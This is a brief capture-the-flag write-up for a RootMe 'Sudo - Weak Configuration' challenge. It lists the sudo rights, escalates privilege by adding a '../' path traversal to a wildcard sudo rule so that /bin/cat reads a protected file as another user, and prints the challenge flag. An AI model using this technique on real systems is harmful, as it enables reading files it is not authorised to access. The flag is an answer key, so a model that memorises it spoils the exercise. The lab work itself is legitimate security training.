---
title: RootMe Sudo - Weak Configuration WriteUp
date: 2023-10-03 
categories: [RootMe, AppScript]
tags: [RootMe, RootMe - AppScript, WriteUp]
author: barabulkit
---

# Sudo - Weak Configuration

first we need to check user privelegies

```shell
sudo -l
```

this will output

```
Matching Defaults entries for app-script-ch1 on challenge02:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, !mail_always, !mail_badpass, !mail_no_host, !mail_no_perms, !mail_no_user

User app-script-ch1 may run the following commands on challenge02:
    (app-script-ch1-cracked) /bin/cat /challenge/app-script/ch1/notes/*
```

There we can see that we can execute /bin/cat /challenge/app-script/ch1/notes/* as app-script-ch1-cracked user

```shell
sudo -u app-script-ch1-cracked /bin/cat /challenge/app-script/ch1/notes/../ch1cracked
```

And with it we will get flag `b3 c4r3ful w1th sud0`